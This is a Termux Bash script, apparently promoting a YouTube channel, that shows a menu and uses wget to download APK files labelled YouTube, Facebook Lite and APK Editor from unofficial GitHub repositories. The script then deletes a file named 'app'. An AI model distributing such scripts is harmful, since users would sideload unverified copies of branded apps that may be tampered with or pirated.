#!/bin/bash

# Define Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

# Create Download Directory
SDCARD_PATH="/storage/emulated/0/Download"
mkdir -p "$SDCARD_PATH"

# App Links
APP1_LINK="https://github.com/webappsite/Application/raw/refs/heads/main/Apk_editor/APK%20Editor.apk"
APP2_LINK="https://github.com/Mouse99-tech/AppsUpdate/raw/refs/heads/main/YouTube.apk"
APP3_LINK="https://github.com/Mouse99-tech/AppsUpdate/raw/refs/heads/main/Lite.apk"

# App File Names
APP1_NAME="Apk Editor.apk"
APP2_NAME="YouTube.apk"
APP3_NAME="Lite.apk"

# Banner
clear
echo -e "${CYAN}"
echo "   ============================================="
echo -e "${YELLOW}   Subscribe my YouTube Channel - ZERODARK NEXUS"
echo -e "${CYAN}   =============================================${NC}"

# Function to download if not already present
download_if_missing() {
    local file_path="$1"
    local file_name="$2"
    local file_link="$3"

    if [[ ! -f "$file_path" ]]; then
        echo -e "${YELLOW}Downloading $file_name...${NC}"
        wget -O "$file_path" "$file_link" && echo -e "${GREEN}Saved to $file_path${NC}" || echo -e "${RED}Failed to download $file_name${NC}"
    else
        echo -e "${BLUE}$file_name already exists in Download folder.${NC}"
    fi
}

# Menu Loop
while true; do
    echo -e "${CYAN}\n[ MENU - Select Apk Number ]"
    echo -e "${GREEN}1.${NC} APK Editor App"
    echo -e "${GREEN}2.${NC} YouTube App"
    echo -e "${GREEN}3.${NC} Facebook Lite App"
    echo -e "${RED}4.${NC} Download All (if missing)"
    echo -e "${RED}5.${NC} Exit"
    echo -e "${CYAN}============================${NC}"
    read -p "$(echo -e ${YELLOW}Enter your choice [1-5]:${NC} ) " choice

    case $choice in
        1)
            download_if_missing "$SDCARD_PATH/$APP1_NAME" "$APP1_NAME" "$APP1_LINK"
            ;;
        2)
            download_if_missing "$SDCARD_PATH/$APP2_NAME" "$APP2_NAME" "$APP2_LINK"
            ;;
        3)
            download_if_missing "$SDCARD_PATH/$APP3_NAME" "$APP3_NAME" "$APP3_LINK"
            ;;
        4)
            download_if_missing "$SDCARD_PATH/$APP1_NAME" "$APP1_NAME" "$APP1_LINK"
            download_if_missing "$SDCARD_PATH/$APP2_NAME" "$APP2_NAME" "$APP2_LINK"
            download_if_missing "$SDCARD_PATH/$APP3_NAME" "$APP3_NAME" "$APP3_LINK"

            if [[ -f "$SDCARD_PATH/$APP1_NAME" && -f "$SDCARD_PATH/$APP2_NAME" && -f "$SDCARD_PATH/$APP3_NAME" ]]; then
                echo -e "${GREEN}All apps downloaded successfully. Thanks!${NC}"
                rm -f app 2>/dev/null
            else
                echo -e "${RED}Some apps failed to download. Script will remain.${NC}"
            fi
            ;;
        5)
            echo -e "${RED}Goodbye Boss!${NC}"
            rm app
            exit
            ;;
        *)
            echo -e "${RED}Invalid choice. Try again.${NC}"
            rm app
            termux-open-url https://youtube.com/@zerodarknexus
            ;;
    esac
done
